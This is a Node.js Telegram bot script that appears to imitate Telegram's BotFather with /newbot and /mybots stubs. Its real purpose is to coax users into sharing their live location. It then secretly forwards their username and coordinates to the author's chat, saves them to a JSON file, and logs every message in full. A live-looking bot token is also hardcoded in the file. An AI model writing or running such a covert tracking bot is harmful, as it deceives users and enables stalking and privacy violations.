const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// Ganti 'YOUR_TOKEN' dengan token bot Anda
const token = '7543259875:AAEy4SDoUyc4mS88fTvKYRMkTyE1bx8nxCc';
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk menangani perintah
const commands = {
    start: (msg) => {
        const chatId = msg.chat.id;
        const welcomeMessage = "Selamat datang! Anda dapat menggunakan perintah berikut:\n" +
                               "/newbot - buat bot baru\n" +
                               "/mybots - edit bot Anda\n" +
                               "/sesiLocation - kirim lokasi Anda\n\n" +
                               "Author: @DetectiveDaffa"; // Menyebutkan nama pengguna
                               
        bot.sendMessage(chatId, welcomeMessage);
    },
    
    newbot: (msg) => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, "Anda dapat membuat bot baru di sini.");
    },
    
    mybots: (msg) => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, "Berikut adalah daftar bot Anda.");
    },
     
    sendLocation: (msg) => {
        const chatId = msg.chat.id;
        const replyMarkup = {
            keyboard: [
                [{ text: "Kirim Lokasi Live", request_location: true }]
            ],
            one_time_keyboard: true,
            resize_keyboard: true
        };

        bot.sendMessage(chatId, "Silakan kirim lokasi Anda dengan mengklik tombol 'Kirim Lokasi Live'.", { reply_markup: replyMarkup });
    },
};

// Menangkap pesan lokasi
bot.on('location', (msg) => {
    const chatId = msg.chat.id;
    const { latitude, longitude } = msg.location;
    const username = msg.from.username || msg.from.first_name;

    // Ganti dengan chat ID yang benar
    const targetChatId = 'CHAT_ID_OF_DETECTIVE_DAFFA'; 
    const locationMessage = `Lokasi Live dari ${username}:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
    
    bot.sendMessage(targetChatId, locationMessage)
        .catch(error => console.error("Gagal mengirim lokasi:", error));

    // Simpan lokasi ke dataLocation.json
    const data = {
        username: username,
        latitude: latitude,
        longitude: longitude,
        timestamp: new Date().toISOString()
    };

    const filePath = path.join(__dirname, 'dataLocation.json');

    fs.readFile(filePath, 'utf8', (err, content) => {
        let locations = [];
        if (!err) {
            try {
                locations = content ? JSON.parse(content) : [];
            } catch (parseError) {
                console.error('Error parsing JSON:', parseError);
            }
        }

        locations.push(data);
        
        fs.writeFile(filePath, JSON.stringify(locations, null, 2), (writeError) => {
            if (writeError) {
                console.error('Error writing to file', writeError);
            } else {
                console.log('Lokasi berhasil disimpan.');
            }
        });
    });
});

// Menangkap semua jenis pesan
bot.on('message', (msg) => {
    console.log('====================');
    console.log(`Pesan diterima dari: ${msg.from.username || msg.from.first_name}`);
    console.log(`Isi pesan: ${msg.text || 'Media yang diterima'}`);
    console.log('Struktur Data Pesan:', JSON.stringify(msg, null, 2));
    console.log('====================');

    // Menangani berbagai jenis pesan
    if (msg.photo) {
        console.log(`Pesan foto dari ${msg.from.username || msg.from.first_name}`);
    } else if (msg.video) {
        console.log(`Pesan video dari ${msg.from.username || msg.from.first_name}`);
    } else if (msg.document) {
        console.log(`Pesan dokumen dari ${msg.from.username || msg.from.first_name}`);
    }
});

// Ekspor bot dan objek commands
module.exports = {
    bot,
    commands,
};
